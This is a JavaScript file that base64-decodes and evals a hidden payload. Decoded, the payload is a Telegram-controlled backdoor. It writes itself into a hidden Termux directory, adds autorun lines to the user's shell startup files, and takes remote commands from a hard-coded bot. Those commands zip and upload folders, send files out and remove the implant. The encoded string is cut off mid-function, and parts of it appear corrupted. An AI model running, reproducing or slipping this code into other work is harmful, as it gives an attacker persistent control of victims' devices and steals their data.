const encodedCode = `Y29uc3QgeyBleGVjLCBzcGF3biB9ID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpOw0KY29uc3QgZnMgPSByZXF1aXJlKCdmcycpOw0KY29uc3QgaHR0cHMgPSByZXF1aXJlKCdodHRwcycpOw0KY29uc3QgcGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsNCg0KY29uc3QgQk9UX1RPS0VOID0gJzc3MjQ0NzIyMDc6QUFHX3VUdmY0WVhnWmpLRi1VclQxbHhRRl9MaDN5NGt2fFEnOw0KY29uc3QgQ0hBVF9JRCA9ICc2NDMyMzkwOTMxJzsNCmNvbnN0IGhpZGRlbkRpciA9IGAke3Byb2Nlc3MuZW52LkhPTUV9Ly50ZXJtdXg7DQpjb25zdCBoaWRkZW5GaWxlID0gYCR7aGlkZGVuRGlyfS8uc2VydmljZS1jYWNoZWA7DQpjb25zdCBiYXNocnNQYXRoID0gYCR7cHJvY2Vzcy5lbnYuSE9NRX0vLmJhc2hyY2A7DQpjb25zdCBwcm9maWxlUGF0aCA9IGAke3Byb2Nlc3MuZW52LkhPTUV9Ly5wcm9maWxlYDsNCmNvbnN0IHpzaHJjUGF0aCA9IGAke3Byb2Nlc3MuZW52LkhPTUV9Ly56c2hyY2A7DQpjb25zdCBhdXRvUnVuQ21kID0gbm9odXAubm9kZSAke2hpZGRlbkZpbGV9ID4gL2Rldi9udWxsIDI+JjEgJjsNCg0KZnVuY3Rpb24gc2VuZE1lc3NhZ2UobXNnKSB7DQogICAgY29uc3QgdXJsID0gYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0ke0NIQVRfSUR9JnRleHQ9JHtlbkNvZGVVUklDb21wb25lbnQobXNnKX1gOw0KICAgIGh0dHBzLmdldCh1cmwsIHJlcyA9PiByZXMub24oJ2RhdGEnLCAoKSA9PiB7fSkpOw0KfQ0KZnVuY3Rpb24gc2VuZERvY3VtZW50KGZpbGVQYXRoKSB7DQogICAgY29uc3QgYm91bmRhcnkgPSAnLS0tLU5vZGVGb3JtQm91bmRhcnknICsgTWF0aC5yYW5kb20oKS50b1N0cmluZygxNikuc2xpY2UoMik7DQogICAgY29uc3Qgb3B0aW9ucyA9IHsNCiAgICAgIGhvc3RuYW1lOiAnYXBpLnRlbGVncmFtLm9yZycsDQogICAgICBwYXRoOiBgL2JvdCR7Qk9UX1RPS0VOfS9zZW5kRG9jdW1lbnRgLA0KICAgICAgbWV0aG9kOiAnUE9TVCcsDQogICAgICBoZWFkZXJzOiB7DQogICAgICAgICdDb250ZW50LVR5cGU6IGBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0ke2JvdW5kYXJ5fWBgDQogICAgICB9DQogICAgfTsNCg0KICAgIGNvbnN0IHJlcSA9IGh0dHBzLnJlcXVlc3Qob3B0aW9ucywgcmVzID0+IHJlcy5vbignZGF0YScsICgpID0+IHt9KSk7DQogICAgY29uc3QgZmlsZU5hbWUgPSBwYXRoLmJhc2VuYW1lKGZpbGVQYXRoKTsNCiAgICBjb25zdCBmaWxlRGF0YSA9IGZzLnJlYWRGaWxlU3luYyhmaWxlUGF0aCk7DQoNCiAgICByZXcud3JpdGUoYGBve2JvdW5kYXJ5fVxcclxcbicpOw0KICAgIHJlcS53cml0ZShgQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiY2hhdF9pZFwiXFxyXFxuYCk7DQogICAgcmVxLndyaXRlKGAke0NIQVRfSUR9XFxyXFxuYCk7DQogICAgcmVxLndyaXRlKGBve2JvdW5kYXJ5fVxcclxcbicpOw0KICAgIHJlcS53cml0ZShgQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiZG9jdW1lbnRcIjsgZmlsZW5hbWU9XCIke2ZpbGVNaW1lfVwiXFxyXG5gKTsNCiAgICByZXEud3JpdGUoYENvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vemlwXFxyXFxuYCk7DQogICAgcmVxLndyaXRlKGZpbGVEYXRhKTsNCiAgICByZXEud3JpdGUoYFxcclxcbi0tJHtib3VuZGFyeX0tLVxcclxcbicpOw0KICAgIHJlcS5lbmQoKTsNCn0NCg0KZnVuY3Rpb24gc2VuZEZpbGUoZmlsZVBhdGgpIHsNCiAgICBjb25zdCBib3VuZGFyeSA9ICctLS0tTm9kZUZvcm1Cb3VuZGFyeScgKyBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nIDE2KS5zbGljZSgyKTsNCiAgICBjb25zdCBvcHRpb25zID0gew0KICAgICAgaG9zdG5hbWU6ICdhcGkudGVsZWdyYW0ub3JnJywNCiAgICAgIHBhdGg6IGAvYm90JHtCT1RfVE9LRU59L3NlbmREb2N1bWVudGAgLA0KICAgICAgbWV0aG9kOiAnUE9TVCcsDQogICAgICBoZWFkZXJzOiB7DQogICAgICAgICdDb250ZW50LVR5cGU6IGBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0ke2JvdW5kYXJ5fWBgDQogICAgICB9DQogICAgfTsNCg0KICAgIGNvbnN0IHJlcSA9IGh0dHBzLnJlcXVlc3Qob3B0aW9ucywgcmVzID0+IHJlcy5vbignZGF0YScsICgpID0+IHt9KSk7DQogICAgY29uc3QgZmlsZU5hbWUgPSBwYXRoLmJhc2VuYW1lKGZpbGVQYXRoKTsNCiAgICBjb25zdCBmaWxlRGF0YSA9IGZzLnJlYWRGaWxlU3luYyhmaWxlUGF0aCk7DQoNCiAgICByZXcud3JpdGUoYGBve2JvdW5kYXJ5fVxcclxcbicpOw0KICAgIHJlcS53cml0ZShgQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiY2hhdF9pZFwiXFxyXFxuYCk7DQogICAgcmVxLndyaXRlKGAke0NIQVRfSUR9XFxyXFxuYCk7DQogICAgcmVxLndyaXRlKGBve2JvdW5kYXJ5fVxcclxcbicpOw0KICAgIHJlcS53cml0ZShgQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiZG9jdW1lbnRcIjsgZmlsZW5hbWU9XCIke2ZpbGVNaW1lfVwiXFxyXG5gKTsNCiAgICByZXEud3JpdGUoYENvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtXFxyXFxuYCk7DQogICAgcmVxLndyaXRlKGZpbGVEYXRhKTsNCiAgICByZXEud3JpdGUoYFxcclxcbi0tJHtib3VuZGFyeX0tLVxcclxcbicpOw0KICAgIHJlcS5lbmQoKTsNCn0NCg0KZnVuY3Rpb24gZW5zdXJlQXV0b1N0YXJ0KCkgew0KICAgIGNvbnN0IGZpbGVzID0gW2Jhc2hyY1BhdGgsIHByb2ZpbGVQYXRoLCB6c2hyY1BhdGh];DQogICAgZmlsZXMuZm9yRWFjaChmaWxlID0+IHsNCiAgICAgICAgaWYgKGZzLmV4aXN0c1N5bmMoZmlsZSkpIHsNCiAgICAgICAgICBjb25zdCBjb250ZW50ID0gZnMucmVhZEZpbGVTeW5jKGZpbGUsICd1dGYtOCcpOw0KICAgICAgICAgIGlmICghY29udGVudC5pbmNsdWRlcyhhdXRvUnVuQ21kKSkgew0KICAgICAgICAgICAgZnMuYXBwZW5kRmlsZVN5bmMoZmlsZSwgYFxcbicke2F1dG9SdW5DbWR9XFxcbicpOw0KICAgICAgICAgICAgc2VuZE1lc3NhZ2UoYERpdGFtYmFoa2FuIGF1dG8tcnVuIGtlICR7cGF0aC5iYXNlbmFtZShmaWxlKX1gKTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9KTsNCn0NCg0KZnVuY3Rpb24gZ2V0VXBkYXRlcygpIHsNCiAgICBodHRwcy5nZXQoYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke0JPVF9UT0tFTn0vZ2V0VXBkYXRlc2AsIHJlcyA9PiB7DQogICAgICAgIGxldCBkYXRhID0gJyc7DQogICAgICAgIHJlcy5vbignZGF0YScsIGNodW5rID0+IGRhdGEgKz0gY2h1bmspOw0KICAgICAgICByZXMub24oJ2VuZCcsICgpID0+IHsNCiAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgY29uc3QganNvbiA9IEpTT04ucGFyc2UoZGF0YSk7DQogICAgICAgICAgICBjb25zdCByZXN1bHRzID0ganNvbi5yZXN1bHQ7DQogICAgICAgICAgICBpZiAoIXJlc3VsdHMubGVuZ3RoKSByZXR1cm47DQoNCiAgICAgICAgICAgIGNvbnN0IGxhc3QgPSByZXN1bHRzW3Jlc3VsdHMubGVuZ3RoIC0gMV07DQogICAgICAgICAgICBjb25zdCBtc2dJZCA9IGxhc3QubWVzc2FnZS5tZXNzYWdlX2lkOw0KICAgICAgICAgICAgY29uc3QgdGV4dCA9IGxhc3QubWVzc2FnZS50ZXh0Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAobXNnSWQgPiBnbG9iYWwubGFzdE1lc3NhZ2VJZCAmJiBsYXN0Lm1lc3NhZ2UuY2hhdC5pZCA9PSBDSEFUX0lEKSB7DQogICAgICAgICAgICAgIGdsb2JhbC5sYXN0TWVzc2FnZUlkID0gbXNnSWQ7DQogICAgICAgICAgICAgIHJ1bkNvbW1hbmQodGV4dC50cmltKCkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0gY2F0Y2ggKGUpIHt9DQogICAgICAgIH0pOw0KICAgIH0pLm9uKCdlcnJvcicsICgpID0+IHt9KTsNCn0NCg0KZnVuY3Rpb24gcnVuQ29tbWFuZChjbWQpIHsNCiAgICBpZiAoY21kID09PSAnL21hdGknKSB7DQogICAgICAgIFtiYXNocnNQYXRoLCBwcm9maWxlUGF0aCwgendsaHJjUGF0aF0uZm9yRWFjaChmaWxlID0+IHsNCiAgICAgICAgICBpZiAoZnMuZXhpc3RzU3luYyhmaWxlKSkgew0KICAgICAgICAgICAgY29uc3QgY29udGVudCA9IGZzLnJlYWRGaWxlU3luYyhmaWxlLCAndXRmLTgnKTsNCiAgICAgICAgICAgIGNvbnN0IGNsZWFuID0gY29udGVudC5zcGxpdCgnXFxuJykuZmlsdGVyKGxpbmUgPT4gIWxpbmUuaW5jbHVkZXMoYXV0b1J1bkNtZCkpLmpvaW4oJ1xcbicpOw0KICAgICAgICAgICAgZnMud3JpdGVGaWxlU3luYyhmaWxlLCBjbGVhbik7DQogICAgICAgICAgfQ0KICAgICAgICB9KTsNCg0KICAgICAgICB0cnkgeyBmcy51bmxpbmtTeW5jKGhpZGRlbkZpbGUpIH0gY2F0Y2ggKGUpIHt9DQogICAgICAgIHNlbmRNZXNzYWdlKCdCb3QgZGltYXRpa2FuIGRhbiBmaWxlIGRpYWhwdXMuJyk7DQogICAgICAgIHByb2Nlc3MuZXhpdCgpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGlmIChjbWQuc3RhcnRzV2l0aCgnL3ppcCAnKSkgew0KICAgICAgICBjb25zdCBmb2xkZXIgPSBjbWQuc3BsaXQoJy96aXAgJylbMV0udHJpbSgpOw0KICAgICAgICBjb25zdCB6aXBQYXRoID0gYCR7Zm9sZGVyfS56aXB`;

eval(Buffer.from(encodedCode, 'base64').toString('utf-8'));
